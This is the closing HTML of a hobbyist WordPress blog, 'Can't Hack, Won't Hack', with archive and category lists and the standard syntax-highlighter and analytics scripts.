	<li><a href='/2012/05/'>May 2012</a></li>
	<li><a href='/2012/04/'>April 2012</a></li>
	<li><a href='/2012/03/'>March 2012</a></li>
	<li><a href='/2011/12/'>December 2011</a></li>
	<li><a href='/2011/11/'>November 2011</a></li>
	<li><a href='/2011/10/'>October 2011</a></li>
	<li><a href='/2011/09/'>September 2011</a></li>
	<li><a href='/2011/07/'>July 2011</a></li>
	<li><a href='/2011/06/'>June 2011</a></li>
	<li><a href='/2011/05/'>May 2011</a></li>
	<li><a href='/2011/04/'>April 2011</a></li>
	<li><a href='/2011/03/'>March 2011</a></li>
	<li><a href='/2011/02/'>February 2011</a></li>
	<li><a href='/2011/01/'>January 2011</a></li>
	<li><a href='/2010/12/'>December 2010</a></li>
	<li><a href='/2010/11/'>November 2010</a></li>
		</ul>
</li><li id="categories-2" class="widget-container widget_categories"><h3 class="widget-title">Categories</h3>		<ul>
	<li class="cat-item cat-item-7"><a href="/category/hardware/arduino/" >Arduino</a>
</li>
	<li class="cat-item cat-item-5"><a href="/category/crafting/" >Crafting</a>
</li>
	<li class="cat-item cat-item-16"><a href="/category/events/" >Events</a>
</li>
	<li class="cat-item cat-item-9"><a href="/category/gardening/" >Gardening</a>
</li>
	<li class="cat-item cat-item-6"><a href="/category/hardware/" >Hardware</a>
</li>
	<li class="cat-item cat-item-4"><a href="/category/programming/" >Programming</a>
</li>
	<li class="cat-item cat-item-10"><a href="/category/software/" >Software</a>
</li>
	<li class="cat-item cat-item-1"><a href="/category/uncategorized/" >Uncategorized</a>
</li>
	<li class="cat-item cat-item-3"><a href="/category/unix/" >Unix</a>
</li>
		</ul>
</li><li id="meta-2" class="widget-container widget_meta"><h3 class="widget-title">Meta</h3>			<ul>
						<li><a href="/wp-login.php">Log in</a></li>
			<li><a href="/feed/">Entries <abbr title="Really Simple Syndication">RSS</abbr></a></li>
			<li><a href="/comments/feed/">Comments <abbr title="Really Simple Syndication">RSS</abbr></a></li>
<li><a href="https://wordpress.org/" title="Powered by WordPress, state-of-the-art semantic personal publishing platform.">WordPress.org</a></li>			</ul>
</li>			</ul>
		</div><!-- #primary .widget-area -->

	</div><!-- #main -->

	<div id="footer" role="contentinfo">
		<div id="colophon">



			<div id="site-info">
				<a href="/" title="Can&#039;t Hack, Won&#039;t Hack" rel="home">
					Can&#039;t Hack, Won&#039;t Hack				</a>
			</div><!-- #site-info -->

			<div id="site-generator"><a href="http://www.php-welt.net/really-static/">powered by really static WordPress</a></div><!-- #site-generator -->

		</div><!-- #colophon -->
	</div><!-- #footer -->

</div><!-- #wrapper -->

	<div style="display:none">
	</div>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shCore.js?ver=2.1.364'></script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushBash.js?ver=2.1.364'></script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/shBrushCpp.js?ver=2.1.364'></script>
<script type='text/javascript'>
	(function(){
		var corecss = document.createElement('link');
		var themecss = document.createElement('link');
		var corecssurl = "http://canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shCore.css?ver=2.1.364";
		if ( corecss.setAttribute ) {
				corecss.setAttribute( "rel", "stylesheet" );
				corecss.setAttribute( "type", "text/css" );
				corecss.setAttribute( "href", corecssurl );
		} else {
				corecss.rel = "stylesheet";
				corecss.href = corecssurl;
		}
		document.getElementsByTagName("head")[0].insertBefore( corecss, document.getElementById("syntaxhighlighteranchor") );
		var themecssurl = "http://canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/styles/shThemeEclipse.css?ver=2.1.364";
		if ( themecss.setAttribute ) {
				themecss.setAttribute( "rel", "stylesheet" );
				themecss.setAttribute( "type", "text/css" );
				themecss.setAttribute( "href", themecssurl );
		} else {
				themecss.rel = "stylesheet";
				themecss.href = themecssurl;
		}
		//document.getElementById("syntaxhighlighteranchor").appendChild(themecss);
		document.getElementsByTagName("head")[0].insertBefore( themecss, document.getElementById("syntaxhighlighteranchor") );
	})();
	SyntaxHighlighter.config.clipboardSwf = 'http://canthack.org/wp-content/plugins/syntaxhighlighter/syntaxhighlighter2/scripts/clipboard.swf';
	SyntaxHighlighter.config.strings.expandSource = 'show source';
	SyntaxHighlighter.config.strings.viewSource = 'view source';
	SyntaxHighlighter.config.strings.copyToClipboard = 'copy to clipboard';
	SyntaxHighlighter.config.strings.copyToClipboardConfirmation = 'The code is in your clipboard now';
	SyntaxHighlighter.config.strings.print = 'print';
	SyntaxHighlighter.config.strings.help = '?';
	SyntaxHighlighter.config.strings.alert = 'SyntaxHighlighter\n\n';
	SyntaxHighlighter.config.strings.noBrush = 'Can\'t find brush for: ';
	SyntaxHighlighter.config.strings.brushNotHtmlScript = 'Brush wasn\'t configured for html-script option: ';
	SyntaxHighlighter.defaults['pad-line-numbers'] = true;
	SyntaxHighlighter.all();
</script>
<script type='text/javascript' src='//s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201521'></script>
<script type='text/javascript' src='//s.gravatar.com/js/gprofiles.js?ver=2015Mayaa'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var WPGroHo = {"my_hash":""};
/* ]]> */
</script>
<script type='text/javascript' src='//canthack.org/wp-content/plugins/jetpack/modules/wpgroho.js?ver=4.2.2'></script>
<script type='text/javascript' src='//stats.wp.com/e-201521.js' async defer></script>
<script type='text/javascript'>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:3.5.3',blog:'21421473',post:'0',tz:'0',srv:'canthack.org'} ]);
	_stq.push([ 'clickTrackerInit', '21421473', '0' ]);
</script>
</body>
</html>
